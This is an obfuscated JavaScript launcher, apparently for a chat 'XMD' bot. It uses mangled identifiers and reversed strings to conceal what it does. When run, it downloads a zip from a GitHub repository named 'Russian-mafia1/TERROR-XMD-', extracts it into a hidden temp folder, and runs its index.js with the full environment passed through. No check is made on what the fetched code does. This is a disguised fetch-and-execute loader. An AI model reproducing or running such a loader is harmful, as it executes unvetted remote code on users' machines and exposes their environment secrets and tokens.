import _0x457384 from 'fs';
import _0xa95cbe from 'path';
import _0x35b30c from 'axios';
import _0x3b8727 from 'unzipper';
import { fileURLToPath } from 'url';
import { spawn } from 'child_process';
import _0x3ca4c0 from 'chalk';
var _0x3g1b = 14;
const __filename = fileURLToPath(import.meta.url);
_0x3g1b = 13;
var _0x8f5e = 14;
const __dirname = _0xa95cbe.dirname(__filename);
_0x8f5e = 3;
var _0xf9gbg = 7;
const TEMP_DIR = _0xa95cbe.join(__dirname, ".botx_temp");
_0xf9gbg = 0;
const EXTRACT_DIR = _0xa95cbe.join(TEMP_DIR, "l-main");
async function downloadAndExtract() {
  if (_0x457384.existsSync(TEMP_DIR)) {
    console.log(_0x3ca4c0.yellow("...redlof dlo gnivomeR".split('').reverse().join('')));
    _0x457384.rmSync(TEMP_DIR, {
      'recursive': true,
      'force': true
    });
  }
  _0x457384.mkdirSync(TEMP_DIR, {
    'recursive': true
  });
  console.log(_0x3ca4c0.blue("...buHtiG morf edoc gnidaolnwoD".split('').reverse().join('')));
  const _0x5a05a7 = await _0x35b30c({
    'url': "https://github.com/Russian-mafia1/TERROR-XMD-/archive/refs/heads/main.zip",
    'method': 'GET',
    'responseType': 'stream'
  });
  await new Promise((_0xa7048b, _0xf4a9f8) => {
    _0x5a05a7.data.pipe(_0x3b8727.Extract({
      'path': TEMP_DIR
    })).on("esolc".split('').reverse().join(''), _0xa7048b).on("rorre".split('').reverse().join(''), _0xf4a9f8);
  });
  console.log(_0x3ca4c0.green("!etelpmoc noitcartxE".split('').reverse().join('')));
}
async function startBot() {
  console.log(_0x3ca4c0.cyan("Starting the bot..."));
  var _0x1c0d78 = 12;
  const _0xb5d586 = spawn("node", [_0xa95cbe.join(EXTRACT_DIR, "sj.xedni".split('').reverse().join(''))], {
    'stdio': "inherit",
    'env': process.env
  });
  _0x1c0d78 = 1;
  _0xb5d586.on("close", _0x10e5ae => {
    console.log(_0x3ca4c0.red("Bot exited with code " + _0x10e5ae));
  });
}
(async () => {
  await downloadAndExtract();
  await startBot();
})();
